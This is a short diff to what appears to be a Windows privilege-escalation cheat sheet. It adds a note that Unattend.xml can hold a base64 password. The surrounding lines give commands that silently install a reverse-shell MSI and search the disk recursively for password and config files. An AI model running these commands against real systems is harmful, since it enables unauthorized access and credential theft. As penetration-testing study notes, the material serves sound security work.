@@ -79,7 +79,7 @@ Confirm perms - overwrite the program? (May need to upload accesschk)
     #upload reverse reverse shell to C:\temp  
     msiexec /quiet /qn /i C:\Temp\reverse.msi
 ## Passwords  
-Run from C:\ (recursive search)  
+Run from C:\ (recursive search). C:\Windows\Panther\Unattend.xml: base64 password    
 
     findstr /si password *.xml *.ini *.txt *.config 2>nul    
     dir /s *pass* == *vnc* == *.config* 2>nul    
